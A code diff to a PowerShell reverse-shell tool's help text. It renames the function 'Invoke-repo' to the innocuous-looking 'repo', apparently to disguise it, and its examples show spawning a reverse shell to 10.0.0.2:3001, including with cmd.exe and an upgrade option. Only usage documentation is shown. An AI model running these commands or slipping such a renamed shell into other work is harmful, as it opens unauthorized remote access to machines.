@@ -1,4 +1,4 @@
-function Invoke-repo
+function repo
 {   
     <#
         .SYNOPSIS
@@ -40,28 +40,28 @@ function Invoke-repo
             Default: "powershell.exe"
             
         .EXAMPLE  
-            PS>Invoke-repo 10.0.0.2 3001
+            PS>repo 10.0.0.2 3001
             
             Description
             -----------
             Spawn a reverse shell
 
         .EXAMPLE
-            PS>Invoke-repo -RemoteIp 10.0.0.2 -RemotePort 3001 -Rows 30 -Cols 90
+            PS>repo -RemoteIp 10.0.0.2 -RemotePort 3001 -Rows 30 -Cols 90
             
             Description
             -----------
             Spawn a reverse shell with specific rows and cols size
             
          .EXAMPLE
-            PS>Invoke-repo -RemoteIp 10.0.0.2 -RemotePort 3001 -Rows 30 -Cols 90 -CommandLine cmd.exe
+            PS>repo -RemoteIp 10.0.0.2 -RemotePort 3001 -Rows 30 -Cols 90 -CommandLine cmd.exe
             
             Description
             -----------
             Spawn a reverse shell (cmd.exe) with specific rows and cols size
             
         .EXAMPLE
-            PS>Invoke-repo -Upgrade -Rows 30 -Cols 90
+            PS>repo -Upgrade -Rows 30 -Cols 90
             
             Description
             -----------
